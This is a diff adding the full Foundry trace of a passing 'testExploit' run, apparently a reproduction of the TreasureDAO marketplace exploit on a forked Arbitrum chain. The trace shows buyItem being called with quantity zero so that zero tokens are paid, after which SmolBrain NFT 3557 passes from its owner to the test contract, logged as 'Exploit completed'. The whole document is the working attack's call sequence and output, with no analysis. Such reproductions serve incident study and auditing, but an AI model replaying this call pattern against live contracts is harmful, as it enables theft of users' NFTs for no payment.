@@ -1,0 +1,144 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/TreasureDAO_exp.sol:ContractTest
+[PASS] testExploit() (gas: 339919)
+Logs:
+  Original NFT owner of SmolBrain:: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165
+  Exploit completed, NFT owner of SmolBrain:: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("arbitrum", 7322694 [7.322e6])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [392119] ContractTest::testExploit()
+    ├─ [2668] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::ownerOf(3557) [staticcall]
+    │   └─ ← [Return] 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165
+    ├─ emit log_named_address(key: "Original NFT owner of SmolBrain:", val: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165)
+    ├─ [347059] 0x812cdA2181ed7c45a35a691E0C85E231D218E273::buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0, 6969000000000000000000 [6.969e21])
+    │   ├─ [7061] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::listings(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000179ca4da0a7d14400000000000000000000000000000000000000000000000000000000017ee748ff2c
+    │   ├─ [2350] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::paymentToken() [staticcall]
+    │   │   └─ ← [Return] 0x000000000000000000000000539bde0d7dbd336b79148aa742883198bbf60342
+    │   ├─ [22271] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0)
+    │   │   ├─ [2337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   ├─ [12128] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, value: 0)
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [350] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::paymentToken() [staticcall]
+    │   │   └─ ← [Return] 0x000000000000000000000000539bde0d7dbd336b79148aa742883198bbf60342
+    │   ├─ [5802] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::approve(0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, 0)
+    │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   ├─ [4662] 0x3f770Ac673856F105b586bb393d122721265aD46::approve(0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, 0) [delegatecall]
+    │   │   │   ├─ emit Approval(owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, spender: 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [224098] 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee::buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0)
+    │   │   ├─ [632] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::supportsInterface(0x80ac58cd) [staticcall]
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [668] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::ownerOf(3557) [staticcall]
+    │   │   │   └─ ← [Return] 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165
+    │   │   ├─ [632] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::supportsInterface(0x80ac58cd) [staticcall]
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [127843] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::safeTransferFrom(0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 3557)
+    │   │   │   ├─ [2538] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::isAtSchool(3557) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [8113] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::tokenOfOwnerByIndex(0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0) [staticcall]
+    │   │   │   │   ├─ [2657] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::balanceOf(0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [31747] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::upgradeSafe(0)
+    │   │   │   │   ├─ [2338] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4294
+    │   │   │   │   ├─ [27839] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::upgradeSafe(0)
+    │   │   │   │   │   ├─ [2723] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::balanceOf(0x59D16389335147E034aA1238cA043Cba907f79Dd) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [12303] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::averageIQ() [staticcall]
+    │   │   │   │   │   │   ├─ [9101] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::totalIQ() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000005712901ea29294f3ebab4
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001dff8c484f43bf78eb
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ emit Approval(owner: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, approved: 0x0000000000000000000000000000000000000000, tokenId: 3557)
+    │   │   │   ├─ emit Transfer(from: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, to: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, tokenId: 3557)
+    │   │   │   ├─ [927] 0x812cdA2181ed7c45a35a691E0C85E231D218E273::onERC721Received(0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 3557, 0x)
+    │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x284fe5fa7fe7498ec95892d8a9cb787ed1b6e09470f2e1c335b8fe5cd940ff5f: 0x00000000000000000000000052b24becae3fa1036ca0e956cd987d48a8f0e165 → 0x000000000000000000000000812cda2181ed7c45a35a691e0c85e231d218e273
+    │   │   │   │   @ 0x117c4475817562a58ec83ee0f1053584f1a51be1a922837c4ec447763dee0716: 3557 → 0
+    │   │   │   │   @ 0xe5a1becfa46410e8106e95d597debb11ddf09775b5e9a5dd7c8ce1bb2fc4e0e9: 0 → 3557
+    │   │   │   │   @ 0x9bdbeeb2a3d85886c31c6dc98788cb55658a8eabf0c1310a9d5dcbb0fe3a51ae: 0 → 1
+    │   │   │   │   @ 0xdcad997cd8e6acc8dfb90f1b906ec211cdfca5098f97be510510fbe14dc5733b: 1 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit ItemSold(: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, : 0x812cdA2181ed7c45a35a691E0C85E231D218E273, : 0x6325439389E0797Ab35752B4F43a14C004f22A9c, : 3557, : 0, : 6969000000000000000000 [6.969e21])
+    │   │   ├─ [49236] 0xb40BC8bF5f4dF00B0b32C56E8d3Ecd802656cCe4::reportSale(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, 0x539bdE0d7Dbd336b79148AA742883198BBF60342, 6969000000000000000000 [6.969e21])
+    │   │   │   ├─ emit PriceUpdate(param0: 0x6325439389E0797Ab35752B4F43a14C004f22A9c, param1: 477322193002434434342397814992046308891884389186 [4.773e47], param2: 0x0000000000000000000000000000000000000dE5, param3: 6969000000000000000000 [6.969e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x07407384436a4f8c47f29af7baab762f37f0464e563950bef2ce90838728218b: 0 → 0x000000000000000000000000539bde0d7dbd336b79148aa742883198bbf60342
+    │   │   │   │   @ 0x07407384436a4f8c47f29af7baab762f37f0464e563950bef2ce90838728218a: 0 → 0x000000000000000000000000000000000000000000000179ca4da0a7d1440000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [9271] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0xDb6Ab450178bAbCf0e467c1F3B436050d907E233, 0)
+    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   ├─ [8128] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0xDb6Ab450178bAbCf0e467c1F3B436050d907E233, 0) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, to: 0xDb6Ab450178bAbCf0e467c1F3B436050d907E233, value: 0)
+    │   │   │   │   ├─ emit Approval(owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, spender: 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [9271] 0x539bdE0d7Dbd336b79148AA742883198BBF60342::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0)
+    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   ├─ [8128] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, 0) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, to: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165, value: 0)
+    │   │   │   │   ├─ emit Approval(owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, spender: 0x2E3b85F85628301a0Bce300Dee3A6B04195A15Ee, value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [632] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::supportsInterface(0x80ac58cd) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [69979] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::safeTransferFrom(0x812cdA2181ed7c45a35a691E0C85E231D218E273, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3557)
+    │   │   ├─ [538] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::isAtSchool(3557) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [3613] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::tokenOfOwnerByIndex(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0) [staticcall]
+    │   │   │   ├─ [2657] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::balanceOf(0x812cdA2181ed7c45a35a691E0C85E231D218E273) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [7747] 0xCca920553ccc9aca80919e614325167d9Ec37b4A::upgradeSafe(0)
+    │   │   │   ├─ [338] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 4294
+    │   │   │   ├─ [5839] 0xd666d1CC3102cd03e07794A61E5F4333B4239F53::upgradeSafe(0)
+    │   │   │   │   ├─ [723] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::balanceOf(0x59D16389335147E034aA1238cA043Cba907f79Dd) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2303] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::averageIQ() [staticcall]
+    │   │   │   │   │   ├─ [1101] 0x602e50Ed10A90D324b35930EC0F8E5D3b28cD509::totalIQ() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000005712901ea29294f3ebab4
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001dff8c484f43bf78eb
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit Approval(owner: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, approved: 0x0000000000000000000000000000000000000000, tokenId: 3557)
+    │   │   ├─ emit Transfer(from: 0x812cdA2181ed7c45a35a691E0C85E231D218E273, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3557)
+    │   │   ├─ [1803] ContractTest::onERC721Received(0x812cdA2181ed7c45a35a691E0C85E231D218E273, 0x812cdA2181ed7c45a35a691E0C85E231D218E273, 3557, 0x)
+    │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   @ 0x9bdbeeb2a3d85886c31c6dc98788cb55658a8eabf0c1310a9d5dcbb0fe3a51ae: 1 → 0
+    │   │   │   @ 0xe5a1becfa46410e8106e95d597debb11ddf09775b5e9a5dd7c8ce1bb2fc4e0e9: 3557 → 0
+    │   │   │   @ 0x284fe5fa7fe7498ec95892d8a9cb787ed1b6e09470f2e1c335b8fe5cd940ff5f: 0x000000000000000000000000812cda2181ed7c45a35a691e0c85e231d218e273 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 3557
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [668] 0x6325439389E0797Ab35752B4F43a14C004f22A9c::ownerOf(3557) [staticcall]
+    │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ emit log_named_address(key: "Exploit completed, NFT owner of SmolBrain:", val: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    ├─  storage changes:
+    │   @ 34: 0 → 0x00000000000000000000000052b24becae3fa1036ca0e956cd987d48a8f0e165
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 80.88s (78.84s CPU time)
+
+Ran 1 test suite in 83.88s (80.88s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
